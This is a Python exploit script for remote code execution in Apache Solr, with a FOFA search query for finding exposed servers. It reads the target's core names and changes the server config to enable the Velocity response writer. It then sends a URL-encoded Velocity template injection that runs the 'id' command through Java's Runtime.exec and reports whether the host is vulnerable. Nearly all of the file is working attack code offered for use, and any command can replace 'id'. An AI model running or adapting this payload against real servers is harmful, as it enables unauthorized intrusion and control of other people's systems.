#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import json
import re

def title():
    print('+          FOFA: app="Apache-Solr"')

def run_core(core_url):
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
        response = requests.get(url=core_url, headers=headers, verify=False, timeout=6)
        core_name = list(json.loads(response.text)["status"])[0]
        return core_name
    except Exception as e:
        return False
def open_params(params_url):
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        headers = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
        set_api_data = """
        {
          "update-queryresponsewriter": {
            "startup": "lazy",
            "name": "velocity",
            "class": "solr.VelocityResponseWriter",
            "template.base.dir": "",
            "solr.resource.loader.enabled": "true",
            "params.resource.loader.enabled": "true"
          }
        }
        """
        response = requests.post(url=params_url, data=set_api_data, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            return True
        else:
            return False
    except Exception as e:
        return False
def run_proto(url):
    core_url = url + "/solr/admin/cores?indexInfo=false&wt=json"
    if run_core(core_url):
        core_name = run_core(core_url)
    else:
        return False
    params_url = url + '/solr/{}/config'.format(core_name)
    if open_params(params_url):
        pass
    else:
        return False
    Vuln_url = url + '''/solr/{}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end'''.format(core_name)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=Vuln_url, headers=headers, verify=False, timeout=10)
        reC = re.search('uid.*?gid.*', response.text, re.I).group()
        if reC:
            print(response.text)
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')

